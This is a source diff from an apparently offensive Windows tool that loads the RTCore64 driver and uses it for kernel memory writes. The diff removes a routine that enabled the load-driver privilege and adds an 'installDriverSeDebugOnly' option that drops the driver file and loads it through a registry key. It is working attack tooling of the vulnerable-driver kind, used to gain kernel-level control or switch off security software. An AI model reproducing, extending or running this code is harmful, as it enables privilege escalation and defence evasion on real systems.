@@ -14,6 +14,7 @@
 #include <string_view>
 
 #include "resource.h"
+#include "loaddriver.h"
 
 #define AUTHOR L"@aceb0nd"
 #define VERSION L"0.3"
@@ -109,58 +110,6 @@ void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
     WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
     WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
 }
-
-BOOL SetPrivilege(
-    HANDLE hToken,          // access token handle
-    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
-    BOOL bEnablePrivilege   // to enable or disable privilege
-)
-{
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
-
-    if (!LookupPrivilegeValue(
-        NULL,            // lookup privilege on local system
-        lpszPrivilege,   // privilege to lookup 
-        &luid))        // receives LUID of privilege
-    {
-        printf("LookupPrivilegeValue error: %u\n", GetLastError());
-        return FALSE;
-    }
-
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    if (bEnablePrivilege)
-        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    else
-        tp.Privileges[0].Attributes = 0;
-
-    // Enable the privilege or disable all privileges.
-
-    if (!AdjustTokenPrivileges(
-        hToken,
-        FALSE,
-        &tp,
-        sizeof(TOKEN_PRIVILEGES),
-        (PTOKEN_PRIVILEGES)NULL,
-        (PDWORD)NULL))
-    {
-        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
-        return FALSE;
-    }
-
-    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
-
-    {
-        printf("The token does not have the specified privilege. \n");
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-
-
 
 
 // END driver comms code
@@ -611,13 +560,6 @@ int wmain(int argc, wchar_t* argv[]) {
         return 0;
     }
 
-    HANDLE hToken;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        wprintf(L"OpenProcessToken error\n");
-    }
-    SetPrivilege(hToken, SE_LOAD_DRIVER_NAME, TRUE);
-
-
 
     const auto svcName = L"RTCore64";
 
@@ -647,6 +589,11 @@ int wmain(int argc, wchar_t* argv[]) {
         if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
             wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
         }
+    }
+    else if (wcscmp(argv[1] + 1, L"installDriverSeDebugOnly") == 0) {
+        WCHAR* driverPath = dropDriver();
+        wchar_t key[] = L"System\\CurrentControlSet\\RTCore64";
+        fullsend(key, driverPath);
     }
     else if (wcscmp(argv[1] + 1, L"uninstallDriver") == 0) {
         service_uninstall(svcName);
